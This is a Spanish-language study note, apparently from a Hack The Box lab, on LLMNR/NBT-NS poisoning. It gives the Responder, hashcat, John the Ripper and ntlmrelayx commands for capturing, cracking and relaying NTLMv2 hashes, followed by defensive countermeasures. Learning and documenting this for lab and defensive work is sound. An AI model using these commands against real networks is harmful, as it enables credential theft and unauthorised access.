---
tags:
  - tecnica
  - categoria/credential-access
  - os/windows
  - nivel/medio
fecha_aprendida: 2026-08-13
fuente: HTB/Responder
mitre_technique: T1557.001
---
# ⚔️ LLMNR / NBT-NS Poisoning

> [!abstract] Resumen
> Cuando la resolución de nombres vía DNS falla, Windows cae a LLMNR y NBT-NS — protocolos de broadcast sin autenticación. Un atacante en el mismo segmento de red responde falsamente a esas consultas y captura el hash NTLMv2 de la víctima cuando esta intenta autenticarse contra él.

---

## ¿Qué es y por qué funciona?

Windows resuelve nombres en este orden: caché local → DNS → LLMNR (puerto UDP 5355) → NBT-NS (puerto UDP/TCP 137). Los dos últimos son protocolos de broadcast/multicast heredados, diseñados para redes pequeñas sin DNS, y no verifican la identidad de quien responde. Si el DNS falla en resolver un nombre (typo, recurso que ya no existe, WPAD mal configurado), cualquier host de la red puede contestar "yo soy ese host" — el cliente le envía entonces sus credenciales en forma de hash NTLMv2 para autenticarse, creyendo que habla con el recurso legítimo. El atacante nunca necesita la contraseña en claro para provocar esto: solo estar en la misma red y escuchar.

---

## Condiciones necesarias para que aplique

> [!warning] Requisitos
> - Atacante en el mismo segmento de red (broadcast) que la víctima
> - LLMNR y/o NBT-NS habilitados en la víctima (default en la mayoría de instalaciones Windows)
> - Algún evento que dispare una resolución de nombre fallida: typo en un share, WPAD habilitado, recurso desconectado, etc.

---

## Procedimiento

### Detección / Enumeración

```bash
# No hay "escaneo" tradicional — se confirma con la presencia de tráfico
# LLMNR/NBT-NS en la red, o simplemente lanzando Responder y esperando
sudo responder -I <interfaz>
```

### Explotación

```bash
# Paso 1: lanzar Responder en modo escucha sobre la interfaz correcta
sudo responder -I tun0

# Paso 2: esperar (o provocar) una resolución de nombre fallida en la víctima
# Responder contesta automáticamente y captura el hash NTLMv2

# Los hashes capturados quedan en:
# /usr/share/responder/logs/SMB-NTLMv2-SSP-<IP>.txt

# Paso 3: crackear el hash offline
hashcat -m 5600 <archivo_hash> /usr/share/wordlists/rockyou.txt --force

# Alternativa: John the Ripper
john --format=netntlmv2 <archivo_hash> --wordlist=rockyou.txt
```

> [!tip] Variaciones comunes
> - Si SMB Signing no está forzado, el hash capturado puede reenviarse (relay) con `ntlmrelayx.py` en vez de crackearse — acceso directo sin conocer la contraseña
> - Responder también puede envenenar mDNS y WPAD (proxy auto-config) — mismo principio, distinto protocolo
> - El hash NTLMv2 es mucho más resistente que NTLMv1 — crackeo depende 100% de la calidad de la wordlist/reglas, no siempre es viable en producción

---

## Herramientas asociadas

| Herramienta | Función | Comando base |
| ----------- | ------- | ------------ |
| Responder | Poisoning LLMNR/NBT-NS/mDNS + captura de hashes | `sudo responder -I <iface>` |
| hashcat | Cracking offline del hash NTLMv2 (modo 5600) | `hashcat -m 5600 hash.txt wordlist.txt` |
| John the Ripper | Alternativa a hashcat | `john --format=netntlmv2 hash.txt` |
| Impacket ntlmrelayx | Relay del hash en vez de crackeo (si no hay SMB Signing) | `ntlmrelayx.py -tf targets.txt` |

---

## Contramedidas (defensa)

> [!info] ¿Cómo se previene?
> Deshabilitar LLMNR (GPO `Turn off Multicast Name Resolution`) y NBT-NS (deshabilitar NetBIOS sobre TCP/IP en cada adaptador). Si hay dependencias legacy que impiden deshabilitarlos, forzar SMB Signing para evitar relay, y monitorear con IDS ante respuestas LLMNR/NBT-NS desde hosts no autorizados. Políticas de contraseña fuertes reducen el éxito del cracking si un hash es capturado igual.

---

## Dónde la usé

- `[[HTB/Responder/Responder]]` — Captura de hash NTLMv2 del usuario `wley`, cracking con hashcat -m 5600

---

## Referencias

- [HackTricks - LLMNR/NBT-NS/mDNS Spoofing](https://book.hacktricks.xyz/windows-hardening/ad-information-in-windows/broadcast-llmnr-nbt-ns-mdns-spoofing)
- [MITRE ATT&CK - T1557.001](https://attack.mitre.org/techniques/T1557/001/)
- [hashcat NTLMv2 mode 5600](https://hashcat.net/wiki/doku.php?id=example_hashes)
